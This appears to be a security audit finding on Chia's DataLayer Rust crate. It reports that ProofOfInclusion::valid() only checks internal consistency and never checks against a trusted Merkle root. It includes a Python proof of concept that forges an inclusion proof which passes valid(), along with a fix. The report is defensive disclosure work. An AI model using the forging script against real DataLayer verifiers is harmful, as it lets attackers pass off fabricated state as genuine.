### Title
`ProofOfInclusion::valid()` Is a Tautological Self-Check That Accepts Forged DataLayer Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` only verifies internal self-consistency of the proof chain. Its final comparison is a tautology: it compares `existing_hash` (which was just set to `layer.combined_hash` in the last loop iteration) against `self.root_hash()` (which returns `last.combined_hash`). These are always equal for any internally consistent proof. The function never compares against an external trusted root hash. Because `ProofOfInclusion` is constructible from arbitrary user input via Python bindings and Streamable deserialization, an attacker can forge a proof of inclusion for any key/value pair that passes `valid()`.

### Finding Description

In `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`, `root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // derived entirely from the proof itself
    } else {
        self.node_hash
    }
}
```

And `valid()` is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;   // existing_hash = layer.combined_hash
    }
    existing_hash == self.root_hash()      // == last.combined_hash — always true
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which was just verified to equal `layer.combined_hash`. `self.root_hash()` returns that same `last.combined_hash`. The final comparison is therefore always `true` for any internally consistent chain, regardless of whether the proof's root matches any real tree root.

### Impact Explanation

Any DataLayer code that receives a `ProofOfInclusion` from an untrusted peer and calls `proof.valid()` as the sole check will accept a completely fabricated proof. The attacker controls `node_hash`, `other_hash`, and `combined_hash`; as long as `combined_hash = SHA256(b"\x02" + node_hash + other_hash)` (or the left-side variant), `valid()` returns `True`. The `root_hash()` returned is the attacker's chosen value, not the actual tree root. This lets untrusted input prove invalid DataLayer state — matching the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state**.

---

### Likelihood Explanation

The `ProofOfInclusion` struct is a first-class Streamable type exposed via Python bindings with a public constructor. Any DataLayer peer protocol that transmits proofs of inclusion and validates them with `valid()` is directly exploitable. The misleading name `valid()` strongly implies the proof is fully validated, making it likely that callers omit the separate `root_hash()` comparison against a trusted root.

---

### Recommendation

`valid()` must accept an external trusted root hash and verify against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against external trusted root
}
```

Alternatively, rename the current `valid()` to `is_internally_consistent()` to make clear it does not verify against any real tree root, and require callers to separately compare `root_hash()` against a trusted value.

### Proof of Concept

```python
import hashlib
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer

# Forge a proof for a completely fabricated node_hash
node_hash  = bytes([0x01] * 32)
other_hash = bytes([0x02] * 32)

# internal_hash(node, other) = SHA256(b"\x02" + node + other)  (Side.Right)
combined_hash = hashlib.sha256(b'\x02' + node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Side.Right
    other_hash=other_hash,
    combined_hash=combined_hash,
)

forged_proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

assert forged_proof.valid()          # True — forged proof accepted
assert forged_proof.root_hash() == combined_hash  # attacker-controlled root
# No real MerkleBlob was consulted; the proof is entirely fabricated.
```

The forged proof passes `valid()` and returns an attacker-controlled `root_hash()`. Any DataLayer verifier that calls only `proof.valid()` without comparing `proof.root_hash()` against a known trusted tree root will accept this fabricated proof as genuine inclusion evidence.
